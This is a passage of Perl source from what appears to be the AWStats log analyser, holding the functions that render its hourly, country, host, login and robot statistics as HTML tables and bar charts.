			if ( $max_h > 0 ) {
				$bredde_h =
				  int( $BarHeight * $_time_h[$ix] / $max_h ) + 1;
			}
			if ( $max_k > 0 ) {
				$bredde_k =
				  int( $BarHeight * $_time_k[$ix] / $max_k ) + 1;
			}
			print "<td>";
			if ( $ShowHoursStats =~ /P/i ) {
				print
"<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vp'}\" height=\"$bredde_p\" width=\"6\""
				  . AltTitle( _t("Pages") . ": " . int( $_time_p[$ix] ) )
				  . " />";
			}
			if ( $ShowHoursStats =~ /H/i ) {
				print
"<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vh'}\" height=\"$bredde_h\" width=\"6\""
				  . AltTitle( _t("Hits") . ": " . int( $_time_h[$ix] ) )
				  . " />";
			}
			if ( $ShowHoursStats =~ /B/i ) {
				print
"<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vk'}\" height=\"$bredde_k\" width=\"6\""
				  . AltTitle(
					_t("Bandwidth") . ": " . Format_Bytes( $_time_k[$ix] ) )
				  . " />";
			}
			print "</td>\n";
		}
		print "</tr>\n";

		# Show hour lib
		print "<tr" . Tooltip(17) . ">";
		for ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {
			print "<th width=\"19\">$ix</th>\n"
			  ;   # width=19 instead of 18 to avoid a MacOS browser bug.
		}
		print "</tr>\n";

		# Show clock icon (replaced with emoji)
		print "<tr" . Tooltip(17) . ">\n";
		
		# Define emoji mapping for 24 hours
		my %hour_emoji = (
			0 => '🕛', 1 => '🕐', 2 => '🕑', 3 => '🕒', 4 => '🕓', 5 => '🕔',
			6 => '🕕', 7 => '🕖', 8 => '🕗', 9 => '🕘', 10 => '🕙', 11 => '🕚',
			12 => '🕛', 13 => '🕐', 14 => '🕑', 15 => '🕒', 16 => '🕓', 17 => '🕔',
			18 => '🕕', 19 => '🕖', 20 => '🕗', 21 => '🕘', 22 => '🕙', 23 => '🕚'
		);
		
		for ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {
			my $hrs = ( $ix >= 12 ? $ix - 12 : $ix );
			my $hre = ( $ix >= 12 ? $ix - 11 : $ix + 1 );
			my $apm = ( $ix >= 12 ? "pm" : "am" );
			my $emoji = $hour_emoji{$ix};
			print
"<td style=\"text-align:center; font-size:1.5em;\" title=\"$hrs:00 - $hre:00 $apm\">$emoji</td>\n";
		}
		print "</tr>\n";
		print "</table>\n";
	}
	print "<br />\n";

	# Show data array for hours
	if ($AddDataArrayShowHoursStats) {
		print "<table width=\"650\"><tr>\n";
		print "<td align=\"center\"><center>\n";

		print "<table>\n";
		print
"<tr><td width=\"80\" bgcolor=\"#$color_TableBGRowTitle\">" . _t("Hours") . "</td>";
		if ( $ShowHoursStats =~ /P/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_p\""
			  . Tooltip(3)
			  . ">" . _t("Pages") . "</td>";
		}
		if ( $ShowHoursStats =~ /H/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_h\""
			  . Tooltip(4)
			  . ">" . _t("Hits") . "</td>";
		}
		if ( $ShowHoursStats =~ /B/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_k\""
			  . Tooltip(5)
			  . ">" . _t("Bandwidth") . "</td>";
		}
		print "</tr>";
		for ( my $ix = 0 ; $ix <= 11 ; $ix++ ) {
			my $monthix = ( $ix < 10 ? "0$ix" : "$ix" );
			print "<tr>";
			print "<td>$monthix</td>";
			if ( $ShowHoursStats =~ /P/i ) {
				print "<td>",
				  Format_Number($_time_p[$monthix] ? $_time_p[$monthix] : "0"),
				  "</td>";
			}
			if ( $ShowHoursStats =~ /H/i ) {
				print "<td>",
				  Format_Number($_time_h[$monthix] ? $_time_h[$monthix] : "0"),
				  "</td>";
			}
			if ( $ShowHoursStats =~ /B/i ) {
				print "<td>", Format_Bytes( int( $_time_k[$monthix] ) ),
				  "</td>";
			}
			print "</tr>\n";
		}
		print "</table>\n";

		print "</center></td>";
		print "<td width=\"10\">&nbsp;</td>";
		print "<td align=\"center\"><center>\n";

		print "<table>\n";
		print
"<tr><td width=\"80\" bgcolor=\"#$color_TableBGRowTitle\">" . _t("Hours") . "</td>";
		if ( $ShowHoursStats =~ /P/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_p\""
			  . Tooltip(3)
			  . ">" . _t("Pages") . "</td>";
		}
		if ( $ShowHoursStats =~ /H/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_h\""
			  . Tooltip(4)
			  . ">" . _t("Hits") . "</td>";
		}
		if ( $ShowHoursStats =~ /B/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_k\""
			  . Tooltip(5)
			  . ">" . _t("Bandwidth") . "</td>";
		}
		print "</tr>\n";
		for ( my $ix = 12 ; $ix <= 23 ; $ix++ ) {
			my $monthix = ( $ix < 10 ? "0$ix" : "$ix" );
			print "<tr>";
			print "<td>$monthix</td>";
			if ( $ShowHoursStats =~ /P/i ) {
				print "<td>",
				  Format_Number($_time_p[$monthix] ? $_time_p[$monthix] : "0"),
				  "</td>";
			}
			if ( $ShowHoursStats =~ /H/i ) {
				print "<td>",
				  Format_Number($_time_h[$monthix] ? $_time_h[$monthix] : "0"),
				  "</td>";
			}
			if ( $ShowHoursStats =~ /B/i ) {
				print "<td>", Format_Bytes( int( $_time_k[$monthix] ) ),
				  "</td>";
			}
			print "</tr>\n";
		}
		print "</table>\n";

		print "</center></td></tr></table>\n";
		print "<br />\n";
	}

	print "</center></td></tr>\n";
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the countries chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainCountries{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) { debug( "ShowDomainsStats", 2 ); }
	print "$Center<a name=\"countries\">&nbsp;</a><br />\n";
	my $title =
_t("Countries") . " (" . _t("Top") . " $MaxNbOf{'Domain'}) &nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'}
		  || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=alldomains")
		: "$StaticLinks.alldomains.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Full list") . "</a>";
	  

    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
       # extend the title to include the added link
           $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
               "$AddLinkToExternalCGIWrapper" . "?section=DOMAIN&baseName=$DirData/$PROG"
           . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
           . "&siteConfig=$SiteConfig" )
           . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    }
        	  
	&tab_head( "$title", 19, 0, 'countries' );
	
	my $total_u = my $total_v = my $total_p = my $total_h = my $total_k = 0;
	my $max_h = 1;
	foreach ( values %_domener_h ) {
		if ( $_ > $max_h ) { $max_h = $_; }
	}
	my $max_k = 1;
	foreach ( values %_domener_k ) {
		if ( $_ > $max_k ) { $max_k = $_; }
	}
	my $count = 0;
	
	&BuildKeyList(
		$MaxNbOf{'Domain'}, $MinHit{'Domain'},
		\%_domener_h,       \%_domener_p
	);
	
	# print the map
	if (scalar @keylist > 1){
		foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
		{
			my @blocklabel = ();
			my @valdata = ();
			my $cnt = 0;
			foreach my $key (@keylist) {
				push @valdata, int( $_domener_h{$key} );
				push @blocklabel, $DomainsHashIDLib{$key};
				$cnt++;
				if ($cnt > 99) { last; }
			}
			print "<tr><td colspan=\"7\" align=\"center\">";
			my $function = "ShowGraph_$pluginname";
			&$function(
				"AWStatsCountryMap", "countries_map",
				0, \@blocklabel,
				0, 0,
				0, 0,
				0, \@valdata
			);
			print "</td></tr>";
		}
	}
	
	print
"<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"$WIDTHCOLICON\">&nbsp;</th><th colspan=\"2\">" . _t("Domain") . "</th>";

	## to add unique visitors and number of visits by calculation of average of the relation with total
	## pages and total hits, and total visits and total unique
	## by Josep Ruano @ CAPSiDE
	if ( $ShowDomainsStats =~ /U/i ) {
		print "<th bgcolor=\"#$color_u\" width=\"80\""
		  . Tooltip(2)
		  . ">" . _t("Unique visitors") . "</th>";
	}
	if ( $ShowDomainsStats =~ /V/i ) {
		print "<th bgcolor=\"#$color_v\" width=\"80\""
		  . Tooltip(1)
		  . ">" . _t("Visits") . "</th>";
	}
	if ( $ShowDomainsStats =~ /P/i ) {
		print "<th bgcolor=\"#$color_p\" width=\"80\""
		  . Tooltip(3)
		  . ">" . _t("Pages") . "</th>";
	}
	if ( $ShowDomainsStats =~ /H/i ) {
		print "<th bgcolor=\"#$color_h\" width=\"80\""
		  . Tooltip(4)
		  . ">" . _t("Hits") . "</th>";
	}
	if ( $ShowDomainsStats =~ /B/i ) {
		print "<th bgcolor=\"#$color_k\" width=\"80\""
		  . Tooltip(5)
		  . ">" . _t("Bandwidth") . "</th>";
	}
	print "<th>&nbsp;</th>";
	print "</tr>\n";
	
	foreach my $key (@keylist) {
		my ( $_domener_u, $_domener_v );
		my $bredde_p = 0;
		my $bredde_h = 0;
		my $bredde_k = 0;
		my $bredde_u = 0;
		my $bredde_v = 0;
		if ( $max_h > 0 ) {
			$bredde_p =
			  int( $BarWidth * $_domener_p{$key} / $max_h ) + 1;
		}    # use max_h to enable to compare pages with hits
		if ( $_domener_p{$key} && $bredde_p == 1 ) { $bredde_p = 2; }
		if ( $max_h > 0 ) {
			$bredde_h =
			  int( $BarWidth * $_domener_h{$key} / $max_h ) + 1;
		}
		if ( $_domener_h{$key} && $bredde_h == 1 ) { $bredde_h = 2; }
		if ( $max_k > 0 ) {
			$bredde_k =
			  int( $BarWidth * ( $_domener_k{$key} || 0 ) / $max_k ) +
			  1;
		}
		if ( $_domener_k{$key} && $bredde_k == 1 ) { $bredde_k = 2; }
		my $newkey = lc($key);
		if ( $newkey eq 'ip' || !$DomainsHashIDLib{$newkey} ) {
			print
"<tr><td width=\"$WIDTHCOLICON\"><img src=\"$DirIcons\/flags\/ip.png\" height=\"14\""
			  . AltTitle(_t("Unknown"))
			  . " /></td><td class=\"aws\">" . _t("Unknown") . "</td><td>$newkey</td>";
		}
		else {
			print
"<tr><td width=\"$WIDTHCOLICON\"><img src=\"$DirIcons\/flags\/$newkey.png\" height=\"14\""
			  . AltTitle("$newkey")
			  . " /></td><td class=\"aws\">$DomainsHashIDLib{$newkey}</td><td>$newkey</td>";
		}
		## to add unique visitors and number of visits, by Josep Ruano @ CAPSiDE
		if ( $ShowDomainsStats =~ /U/i ) {
			$_domener_u = (
				  $_domener_p{$key}
				? $_domener_p{$key} / $TotalPages
				: 0
			);
			$_domener_u += ( $_domener_h{$key} / $TotalHits );
			$_domener_u =
			  sprintf( "%.0f", ( $_domener_u * $TotalUnique ) / 2 );
			print "<td>".Format_Number($_domener_u)." ("
			  . sprintf( "%.1f%", 100 * $_domener_u / $TotalUnique )
			  . ")</td>";
		}
		if ( $ShowDomainsStats =~ /V/i ) {
			$_domener_v = (
				  $_domener_p{$key}
				? $_domener_p{$key} / $TotalPages
				: 0
			);
			$_domener_v += ( $_domener_h{$key} / $TotalHits );
			$_domener_v =
			  sprintf( "%.0f", ( $_domener_v * $TotalVisits ) / 2 );
			print "<td>".Format_Number($_domener_v)." ("
			  . sprintf( "%.1f%", 100 * $_domener_v / $TotalVisits )
			  . ")</td>";
		}

		if ( $ShowDomainsStats =~ /P/i ) {
			print "<td>"
			  . ( $_domener_p{$key} ? Format_Number($_domener_p{$key}) : '&nbsp;' )
			  . "</td>";
		}
		if ( $ShowDomainsStats =~ /H/i ) {
			print "<td>".Format_Number($_domener_h{$key})."</td>";
		}
		if ( $ShowDomainsStats =~ /B/i ) {
			print "<td>" . Format_Bytes( $_domener_k{$key} ) . "</td>";
		}
		print "<td class=\"aws\">";

		if ( $ShowDomainsStats =~ /P/i ) {
			print
"<img src=\"$DirIcons\/other\/$BarPng{'hp'}\" width=\"$bredde_p\" height=\"5\""
			  . AltTitle("")
			  . " /><br />\n";
		}
		if ( $ShowDomainsStats =~ /H/i ) {
			print
"<img src=\"$DirIcons\/other\/$BarPng{'hh'}\" width=\"$bredde_h\" height=\"5\""
			  . AltTitle("")
			  . " /><br />\n";
		}
		if ( $ShowDomainsStats =~ /B/i ) {
			print
"<img src=\"$DirIcons\/other\/$BarPng{'hk'}\" width=\"$bredde_k\" height=\"5\""
			  . AltTitle("") . " />";
		}
		print "</td>";
		print "</tr>\n";

		$total_u += $_domener_u;
		$total_v += $_domener_v;
		$total_p += $_domener_p{$key};
		$total_h += $_domener_h{$key};
		$total_k += $_domener_k{$key} || 0;
		$count++;
	}
	my $rest_u = $TotalUnique - $total_u;
	my $rest_v = $TotalVisits - $total_v;
	my $rest_p = $TotalPages - $total_p;
	my $rest_h = $TotalHits - $total_h;
	my $rest_k = $TotalBytes - $total_k;
	if (   $rest_u > 0
		|| $rest_v > 0
		|| $rest_p > 0
		|| $rest_h > 0
		|| $rest_k > 0 )
	{    # All other domains (known or not)
		print
"<tr><td width=\"$WIDTHCOLICON\">&nbsp;</td><td colspan=\"2\" class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td>";
		if ( $ShowDomainsStats =~ /U/i ) { print "<td>$rest_u</td>"; }
		if ( $ShowDomainsStats =~ /V/i ) { print "<td>$rest_v</td>"; }
		if ( $ShowDomainsStats =~ /P/i ) { print "<td>$rest_p</td>"; }
		if ( $ShowDomainsStats =~ /H/i ) { print "<td>$rest_h</td>"; }
		if ( $ShowDomainsStats =~ /B/i ) {
			print "<td>" . Format_Bytes($rest_k) . "</td>";
		}
		print "<td class=\"aws\">&nbsp;</td>";
		print "</tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the hosts chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainHosts{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) { debug( "ShowHostsStats", 2 ); }
	print "$Center<a name=\"visitors\">&nbsp;</a><br />\n";
	my $title =
_t("Visitors") . " (" . _t("Top") . " $MaxNbOf{'HostsShown'}) &nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'}
		  || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=allhosts")
		: "$StaticLinks.allhosts.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Full list") . "</a> &nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'}
		  || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=lasthosts")
		: "$StaticLinks.lasthosts.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Last") . "</a> &nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'}
		  || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=unknownip")
		: "$StaticLinks.unknownip.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Unresolved IP Address") . "</a>";
	  
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
       # extend the title to include the added link
           $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
               "$AddLinkToExternalCGIWrapper" . "?section=VISITOR&baseName=$DirData/$PROG"
           . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
           . "&siteConfig=$SiteConfig" )
           . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    }
	  
	&tab_head( "$title", 19, 0, 'visitors' );
	
	&BuildKeyList( $MaxNbOf{'HostsShown'}, $MinHit{'Host'}, \%_host_h,
		\%_host_p );
		
	# Graph the top five in a pie chart
	if (scalar @keylist > 1){
		foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
		{
			my @blocklabel = ();
			my @valdata = ();
			my @valcolor = ($color_p);

			my $cnt = 0;
			my $suma = 0;
			foreach my $key (@keylist) {
               $suma=$suma + ( $_host_h{$key});
               $cnt++;
               if ($cnt > 4) { last; }
			}
			
			$cnt = 0;
			foreach my $key (@keylist) {
               push @valdata, int( $_host_h{$key} / $suma * 1000 ) / 10;
               push @blocklabel, "$key";
               $cnt++;
               if ($cnt > 4) { last; }
			}
			
			print "<tr><td colspan=\"7\">";
			my $function = "ShowGraph_$pluginname";
			&$function(
				"Hosts", "hosts",
				0, \@blocklabel,
				0, \@valcolor,
				0, 0,
				0, \@valdata
			);
			print "</td></tr>";
		}
	}
	
	print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
	print "<th>";
	if ( $MonthRequired ne 'all' ) {
		print
_t("Visitors") . " : ".Format_Number($TotalHostsKnown)." " . _t("Known") . ", ".Format_Number($TotalHostsUnknown)." " . _t("Unknown") . "<br />".Format_Number($TotalUnique)." " . _t("Unique visitors") . "</th>";
	}
	else {
		print _t("Visitors") . " : " . ( scalar keys %_host_h ) . "</th>";
	}
	&HTMLShowHostInfo('__title__');
	if ( $ShowHostsStats =~ /P/i ) {
		print "<th bgcolor=\"#$color_p\" width=\"80\""
		  . Tooltip(3)
		  . ">" . _t("Pages") . "</th>";
	}
	if ( $ShowHostsStats =~ /H/i ) {
		print "<th bgcolor=\"#$color_h\" width=\"80\""
		  . Tooltip(4)
		  . ">" . _t("Hits") . "</th>";
	}
	if ( $ShowHostsStats =~ /B/i ) {
		print "<th bgcolor=\"#$color_k\" width=\"80\""
		  . Tooltip(5)
		  . ">" . _t("Bandwidth") . "</th>";
	}
	if ( $ShowHostsStats =~ /L/i ) {
		print "<th width=\"120\">" . _t("Last") . "</th>";
	}
	print "</tr>\n";
	my $total_p = my $total_h = my $total_k = 0;
	my $count = 0;
	
	my $regipv4 = qr/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;	

        if ( $DynamicDNSLookup == 2 ) {
	        # Use static DNS file
                &Read_DNS_Cache( \%MyDNSTable, "$DNSStaticCacheFile", "", 1 );
        }

	foreach my $key (@keylist) {
		print "<tr>";
		print "<td class=\"aws\">$key";

		if ($DynamicDNSLookup) {
	                # Dynamic reverse DNS lookup
	                if ($key =~ /$regipv4/o) {
		                my $lookupresult=lc(gethostbyaddr(pack("C4",split(/\./,$key)),AF_INET));	# This may be slow
                	        if (! $lookupresult || $lookupresult =~ /$regipv4/o || ! IsAscii($lookupresult)) {
                                        if ( $DynamicDNSLookup == 2 ) {
                                                # Check static DNS file
                                                $lookupresult = $MyDNSTable{$key};
                                                if ($lookupresult) { print " ($lookupresult)"; }
                                                else { print ""; }
                                        }
                                        else { print ""; }
                                }
                                else { print " ($lookupresult)"; }
                        }
                }

		print "</td>";
		&HTMLShowHostInfo($key);
		if ( $ShowHostsStats =~ /P/i ) {
			print '<td>' . ( Format_Number($_host_p{$key}) || "&nbsp;" ) . '</td>';
		}
		if ( $ShowHostsStats =~ /H/i ) {
			print "<td>".Format_Number($_host_h{$key})."</td>";
		}
		if ( $ShowHostsStats =~ /B/i ) {
			print '<td>' . Format_Bytes( $_host_k{$key} ) . '</td>';
		}
		if ( $ShowHostsStats =~ /L/i ) {
			print '<td nowrap="nowrap">'
			  . (
				$_host_l{$key}
				? Format_Date( $_host_l{$key}, 1 )
				: '-'
			  )
			  . '</td>';
		}
		print "</tr>\n";
		$total_p += $_host_p{$key};
		$total_h += $_host_h{$key};
		$total_k += $_host_k{$key} || 0;
		$count++;
	}
	my $rest_p = $TotalPages - $total_p;
	my $rest_h = $TotalHits - $total_h;
	my $rest_k = $TotalBytes - $total_k;
	if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )
	{    # All other visitors (known or not)
		print "<tr>";
		print
"<td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td>";
		&HTMLShowHostInfo('');
		if ( $ShowHostsStats =~ /P/i ) { print "<td>".Format_Number($rest_p)."</td>"; }
		if ( $ShowHostsStats =~ /H/i ) { print "<td>".Format_Number($rest_h)."</td>"; }
		if ( $ShowHostsStats =~ /B/i ) {
			print "<td>" . Format_Bytes($rest_k) . "</td>";
		}
		if ( $ShowHostsStats =~ /L/i ) { print "<td>&nbsp;</td>"; }
		print "</tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the logins chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainLogins{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) { debug( "ShowAuthenticatedUsers", 2 ); }
	print "$Center<a name=\"logins\">&nbsp;</a><br />\n";
	my $title =
_t("Login") . " (" . _t("Top") . " $MaxNbOf{'LoginShown'}) &nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'}
		  || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=alllogins")
		: "$StaticLinks.alllogins.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Full list") . "</a>";
	if ( $ShowAuthenticatedUsers =~ /L/i ) {
		$title .= " &nbsp; - &nbsp; <a href=\""
		  . (
			$ENV{'GATEWAY_INTERFACE'}
			  || !$StaticLinks
			? XMLEncode("$AWScript${NewLinkParams}output=lastlogins")
			: "$StaticLinks.lastlogins.$StaticExt"
		  )
		  . "\"$NewLinkTarget>" . _t("Last") . "</a>";
	}
	&tab_head( "$title", 19, 0, 'logins' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>" . _t("Login") . " : "
	  . Format_Number(( scalar keys %_login_h )) . "</th>";
	&HTMLShowUserInfo('__title__');
	if ( $ShowAuthenticatedUsers =~ /P/i ) {
		print "<th bgcolor=\"#$color_p\" width=\"80\""
		  . Tooltip(3)
		  . ">" . _t("Pages") . "</th>";
	}
	if ( $ShowAuthenticatedUsers =~ /H/i ) {
		print "<th bgcolor=\"#$color_h\" width=\"80\""
		  . Tooltip(4)
		  . ">" . _t("Hits") . "</th>";
	}
	if ( $ShowAuthenticatedUsers =~ /B/i ) {
		print "<th bgcolor=\"#$color_k\" width=\"80\""
		  . Tooltip(5)
		  . ">" . _t("Bandwidth") . "</th>";
	}
	if ( $ShowAuthenticatedUsers =~ /L/i ) {
		print "<th width=\"120\">" . _t("Last") . "</th>";
	}
	print "</tr>\n";
	my $total_p = my $total_h = my $total_k = 0;
	my $max_h = 1;
	foreach ( values %_login_h ) {
		if ( $_ > $max_h ) { $max_h = $_; }
	}
	my $max_k = 1;
	foreach ( values %_login_k ) {
		if ( $_ > $max_k ) { $max_k = $_; }
	}
	my $count = 0;
	&BuildKeyList( $MaxNbOf{'LoginShown'}, $MinHit{'Login'}, \%_login_h,
		\%_login_p );
	foreach my $key (@keylist) {
		my $bredde_p = 0;
		my $bredde_h = 0;
		my $bredde_k = 0;
		if ( $max_h > 0 ) {
			$bredde_p = int( $BarWidth * $_login_p{$key} / $max_h ) + 1;
		}    # use max_h to enable to compare pages with hits
		if ( $max_h > 0 ) {
			$bredde_h = int( $BarWidth * $_login_h{$key} / $max_h ) + 1;
		}
		if ( $max_k > 0 ) {
			$bredde_k = int( $BarWidth * $_login_k{$key} / $max_k ) + 1;
		}
		print "<tr><td class=\"aws\">$key</td>";
		&HTMLShowUserInfo($key);
		if ( $ShowAuthenticatedUsers =~ /P/i ) {
			print "<td>"
			  . ( $_login_p{$key} ? Format_Number($_login_p{$key}) : "&nbsp;" )
			  . "</td>";
		}
		if ( $ShowAuthenticatedUsers =~ /H/i ) {
			print "<td>".Format_Number($_login_h{$key})."</td>";
		}
		if ( $ShowAuthenticatedUsers =~ /B/i ) {
			print "<td>" . Format_Bytes( $_login_k{$key} ) . "</td>";
		}
		if ( $ShowAuthenticatedUsers =~ /L/i ) {
			print "<td>"
			  . (
				$_login_l{$key}
				? Format_Date( $_login_l{$key}, 1 )
				: '-'
			  )
			  . "</td>";
		}
		print "</tr>\n";
		$total_p += $_login_p{$key};
		$total_h += $_login_h{$key};
		$total_k += $_login_k{$key};
		$count++;
	}
	my $rest_p = $TotalPages - $total_p;
	my $rest_h = $TotalHits - $total_h;
	my $rest_k = $TotalBytes - $total_k;
	if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )
	{    # All other logins
		print
		  "<tr><td class=\"aws\"><span style=\"color: #$color_other\">"
		  . ( $PageDir eq 'rtl' ? "<span dir=\"ltr\">" : "" )
		  . _t("Anonymous")
		  . ( $PageDir eq 'rtl' ? "</span>" : "" )
		  . "</span></td>";
		&HTMLShowUserInfo('');
		if ( $ShowAuthenticatedUsers =~ /P/i ) {
			print "<td>" . ( $rest_p ? Format_Number($rest_p) : "&nbsp;" ) . "</td>";
		}
		if ( $ShowAuthenticatedUsers =~ /H/i ) {
			print "<td>".Format_Number($rest_h)."</td>";
		}
		if ( $ShowAuthenticatedUsers =~ /B/i ) {
			print "<td>" . Format_Bytes($rest_k) . "</td>";
		}
		if ( $ShowAuthenticatedUsers =~ /L/i ) {
			print "<td>&nbsp;</td>";
		}
		print "</tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the robots chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainRobots{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) { debug( "ShowRobotStats", 2 ); }
	print "$Center<a name=\"robots\">&nbsp;</a><br />\n";

	my $title = _t("Robots") . " (" . _t("Top") . " $MaxNbOf{'RobotShown'}) &nbsp; - &nbsp; <a href=\""
		  . (
			$ENV{'GATEWAY_INTERFACE'}
			  || !$StaticLinks
			? XMLEncode("$AWScript${NewLinkParams}output=allrobots")
			: "$StaticLinks.allrobots.$StaticExt"
		  )
		  . "\"$NewLinkTarget>" . _t("Full list") . "</a> &nbsp; - &nbsp; <a href=\""
		  . (
			$ENV{'GATEWAY_INTERFACE'}
			  || !$StaticLinks
			? XMLEncode("$AWScript${NewLinkParams}output=lastrobots")
			: "$StaticLinks.lastrobots.$StaticExt"
		  )
		  . "\"$NewLinkTarget>" . _t("Last") . "</a>";

    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
       # extend the title to include the added link
           $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
               "$AddLinkToExternalCGIWrapper" . "?section=ROBOT&baseName=$DirData/$PROG"
           . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
           . "&siteConfig=$SiteConfig" )
           . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    }
        
    &tab_head( "$title", 19, 0, 'robots');
        
    print "<tr bgcolor=\"#$color_TableBGRowTitle\""
	  . Tooltip(16) . "><th>"
	  . Format_Number(( scalar keys %_robot_h ))
	  . " " . _t("Different robots") . "*</th>";
	if ( $ShowRobotsStats =~ /H/i ) {
		print
		  "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>";
	}
	if ( $ShowRobotsStats =~ /B/i ) {
		print
		  "<th bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>";
	}
	if ( $ShowRobotsStats =~ /L/i ) {
		print "<th width=\"120\">" . _t("Last") . "</th>";
	}
	print "</tr>\n";
	my $total_p = my $total_h = my $total_k = my $total_r = 0;
	my $count = 0;
	&BuildKeyList( $MaxNbOf{'RobotShown'}, $MinHit{'Robot'}, \%_robot_h,
		\%_robot_h );
	foreach my $key (@keylist) {
		print "<tr><td class=\"aws\">"
		  . ( $PageDir eq 'rtl' ? "<span dir=\"ltr\">" : "" )
		  . ( $RobotsHashIDLib{$key} ? $RobotsHashIDLib{$key} : $key )
		  . ( $PageDir eq 'rtl' ? "</span>" : "" ) . "</td>";
		if ( $ShowRobotsStats =~ /H/i ) {
			print "<td>"
			  . Format_Number(( $_robot_h{$key} - $_robot_r{$key} ))
			  . ( $_robot_r{$key} ? "+$_robot_r{$key}" : "" ) . "</td>";
		}
		if ( $ShowRobotsStats =~ /B/i ) {
			print "<td>" . Format_Bytes( $_robot_k{$key} ) . "</td>";
		}
		if ( $ShowRobotsStats =~ /L/i ) {
			print "<td>"
			  . (
				$_robot_l{$key}
				? Format_Date( $_robot_l{$key}, 1 )
				: '-'
			  )
			  . "</td>";
		}
		print "</tr>\n";

		#$total_p += $_robot_p{$key};
		$total_h += $_robot_h{$key};
		$total_k += $_robot_k{$key} || 0;
		$total_r += $_robot_r{$key} || 0;
		$count++;
	}

	# For bots we need to count Totals
	my $TotalPagesRobots =
	  0;    #foreach (values %_robot_p) { $TotalPagesRobots+=$_; }
	my $TotalHitsRobots = 0;
	foreach ( values %_robot_h ) { $TotalHitsRobots += $_; }
	my $TotalBytesRobots = 0;
	foreach ( values %_robot_k ) { $TotalBytesRobots += $_; }
	my $TotalRRobots = 0;
	foreach ( values %_robot_r ) { $TotalRRobots += $_; }
	my $rest_p = 0;    #$rest_p=$TotalPagesRobots-$total_p;
	my $rest_h = $TotalHitsRobots - $total_h;
	my $rest_k = $TotalBytesRobots - $total_k;
	my $rest_r = $TotalRRobots - $total_r;

	if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 || $rest_r > 0 )
	{               # All other robots
		print
"<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td>";
		if ( $ShowRobotsStats =~ /H/i ) {
			print "<td>"
			  . Format_Number(( $rest_h - $rest_r ))
